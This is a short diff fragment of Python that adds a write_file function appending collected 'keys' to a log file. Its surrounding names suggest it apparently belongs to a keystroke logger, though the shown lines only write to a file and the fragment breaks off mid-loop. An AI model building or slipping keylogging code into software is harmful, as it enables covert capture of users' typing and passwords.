@@ -136,3 +136,8 @@ while number_of_iterations < number_of_iterations_end:
             count = 0
             write_file(keys)
             keys = []
+
+    def write_file(keys):
+        with open(file_path + extend + keys_info, "a") as f:
+            for key in keys:
+                k = str(key).replace("'","")
